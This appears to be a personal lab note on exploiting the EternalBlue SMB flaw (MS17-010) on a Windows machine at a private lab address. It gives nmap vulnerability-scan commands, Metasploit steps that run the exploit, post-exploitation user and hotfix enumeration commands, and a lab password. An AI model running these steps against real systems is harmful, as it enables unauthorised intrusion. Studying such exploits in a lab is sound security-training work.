### MetaSploit - 1

Windows Domain Server Setup:
Passwd:Vpn!123

namp: Check if the sys is vul to ms17
```
cd /usr/share/nmap/scripts
ls -lah | grep smb-
sudo nmap -sV -p 445 -O --script=smb-vuln-ms17-010.nse 10.0.2.5
```
OR
```
target=10.0.2.5
p=445          
scriptargs='smbpass=','smbdomain=mydomain.com','unsafe=1'
for script in $(ls smb* | grep -v -e brute -e flood); do echo "=== $script ==="; sudo nmap $(echo $target) -script=$script -script-args="${scriptargs}" -p $p| grep "|" ; done
```


```linux
┌──(root㉿kali)-[/home/kali]
└─# msfconsole

msf6 > search ms17
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOST 10.0.2.5
msf6 > run
```




### Links:
- Exploit Eternal Blue (MS17–010) for Window 7 and higher (custom payload)
https://infosecwriteups.com/exploit-eternal-blue-ms17-010-for-window-7-and-higher-custom-payload-efd9fcc8b623



---
Cmds to check win user info:
```
net user 
net user user1
systeminfo
getuid

To get the hotfix run privi powershell:
Get-Hotfix -id KB3192137
```